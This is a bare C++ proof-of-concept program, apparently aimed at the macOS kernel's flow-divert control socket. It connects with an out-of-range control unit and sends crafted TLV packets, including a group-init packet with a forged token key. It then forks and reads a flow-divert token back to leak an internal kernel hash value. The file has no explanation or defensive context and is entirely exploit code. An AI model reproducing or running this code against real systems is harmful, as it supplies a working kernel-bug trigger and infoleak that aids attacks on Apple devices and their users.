#include <iostream>
#include <cstring>
#include <sys/socket.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/ioctl.h>
#include <sys/kern_control.h>
#include <sys/sys_domain.h>

constexpr int FLOW_DIVERT_TLV_CTL_UNIT = 10;
constexpr int FLOW_DIVERT_TLV_AGGREGATE_UNIT = 26;
constexpr int FLOW_DIVERT_TLV_SIGNING_ID = 25;
constexpr int FLOW_DIVERT_PKT_GROUP_INIT = 6;
constexpr int FLOW_DIVERT_TLV_TOKEN_KEY = 17;

struct flow_divert_create_packet {
    char Type;
    uint32_t Length;
    uint32_t Unit;
}__attribute__((packed));

int sock_fd;
uint32_t pcb_hash;

void do_token() {
    sock_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock_fd < 0) {
        perror("[do_token:socket]");
        exit(EXIT_FAILURE);
    }

    flow_divert_create_packet packet {
        .Type = FLOW_DIVERT_TLV_CTL_UNIT,
        .Length = htonl(4),
        .Unit = htonl(0x0FFFFFFF),
    };

    if (setsockopt(sock_fd, SOL_SOCKET, SO_FLOW_DIVERT_TOKEN, &packet, sizeof(packet)) < 0) {
        perror("[do_token:setsockopt]");
        exit(EXIT_FAILURE);
    }

    char to_BUF[0x40] = {0};
    socklen_t Length = 0x40;

    if (!fork()) {
        printf("Child PID:%d\n", getpid());
        listen(sock_fd, 5);
        getsockopt(sock_fd, SOL_SOCKET, SO_FLOW_DIVERT_TOKEN, to_BUF, &Length);
        pcb_hash = *(uint32_t*)(to_BUF + 14);
        printf("PCB_HASH_VAL:\t\t%#x\n", pcb_hash);
    }
}

int connect_kctl() {
    int sock_kctl = socket(AF_SYSTEM, SOCK_DGRAM, SYSPROTO_CONTROL);
    if (sock_kctl < 0) {
        perror("[connect_kctl:socket]");
        exit(EXIT_FAILURE);
    }

    struct sockaddr_ctl target;
    target.sc_len = sizeof(target);
    target.sc_family = AF_SYSTEM;
    target.ss_sysaddr = AF_SYS_CONTROL;

    struct ctl_info info;
    memset(&info, 0, sizeof(info));
    strlcpy(info.ctl_name, "com.apple.flow-divert", sizeof(info.ctl_name));
    
    if (ioctl(sock_kctl, CTLIOCGINFO, &info) == -1) {
        perror("[connect_kctl:ioctl]");
        exit(EXIT_FAILURE);
    }

    target.sc_id = info.ctl_id;
    target.sc_unit = 0x0FFFFFFF;

    if (connect(sock_kctl, (struct sockaddr *)&target, sizeof(target)) == -1) {
        perror("[connect_kctl:connect]");
        exit(EXIT_FAILURE);
    }

    return sock_kctl;
}

void group_init(int fd) {
    char mem[0x200] = {0};
    uint32_t length = 0;

    struct flow_divert_packet_header *init_packet = reinterpret_cast<struct flow_divert_packet_header*>(mem);
    init_packet->packet_type = FLOW_DIVERT_PKT_GROUP_INIT;
    init_packet->conn_id = htonl(0);

    struct init_data {
        uint8_t  Type;
        uint32_t Length;
        char     to_BUF[4];
    }__attribute__((packed));

    struct init_data *key_size = reinterpret_cast<struct init_data *>(mem + sizeof(struct flow_divert_packet_header));
    key_size->Type = FLOW_DIVERT_TLV_TOKEN_KEY;
    key_size->Length = htonl(4);
    *(reinterpret_cast<uint32_t*>(key_size->to_BUF)) = htonl(4);

    struct init_data *token = reinterpret_cast<struct init_data *>(mem + sizeof(struct flow_divert_packet_header) + 9);
    token->Type = FLOW_DIVERT_TLV_TOKEN_KEY;
    token->Length = htonl(4);
    *(reinterpret_cast<uint32_t*>(token->to_BUF)) = htonl(0xDEADBEEF);

    length = sizeof(struct flow_divert_packet_header) + 9 + 9;
    if (send(fd, mem, length, 0) < 0) {
        perror("[group_init]");
        exit(EXIT_FAILURE);
    }
}

int main() {
    printf("Parent PID:%d\n", getpid());

    int sock_kctl = connect_kctl();
    group_init(sock_kctl);
    do_token();

    sleep(10);
    printf("Closing Socket\n");
    close(sock_fd);
    close(sock_kctl);
    return 0;
}
